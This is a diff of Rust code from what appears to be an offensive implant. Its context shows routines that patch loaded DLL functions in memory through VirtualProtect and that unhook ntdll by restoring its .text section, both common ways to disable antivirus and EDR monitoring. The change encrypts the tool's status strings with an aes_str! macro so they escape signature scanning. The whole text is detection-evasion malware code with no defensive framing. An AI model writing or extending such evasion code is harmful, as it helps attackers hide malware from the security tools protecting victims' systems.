@@ -63,10 +63,10 @@ unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, 
     let func_c = CString::new(func).unwrap();
 
     let h = LoadLibraryA(dll_c.as_ptr());
-    if h.is_null() { return Err(format!("{} not found", dll)); }
+    if h.is_null() { return Err(format!("{} {}", dll, aes_str!("not found"))); }
 
     let p = GetProcAddress(h, func_c.as_ptr());
-    if p.is_null() { return Err(format!("{} not found in {}", func, dll)); }
+    if p.is_null() { return Err(format!("{} {} {}", func, aes_str!("not found in"), dll)); }
 
     let mut old = 0u32;
     if VirtualProtect(p, patch.len(), page_execute_readwrite, &mut old) == 0 {
@@ -78,7 +78,7 @@ unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, 
     let mut tmp = 0u32;
     VirtualProtect(p, patch.len(), old, &mut tmp);
 
-    Ok(format!("Patched {}!{}", dll, func))
+    Ok(format!("{} {}!{}", aes_str!("Patched"), dll, func))
 }
 
 // ── Ntdll Unhooking ────────────────────────────────────────────────────
@@ -206,7 +206,7 @@ pub fn unhook_ntdll() -> Result<String, String> {
         CloseHandle(h_mapping);
         CloseHandle(h_file);
 
-        Ok(format!("Ntdll unhooked: restored {} bytes in .text", text_size))
+        Ok(format!("{} {} {}", aes_str!("Ntdll unhooked: restored"), text_size, aes_str!("bytes in .text")))
     }
 }
 
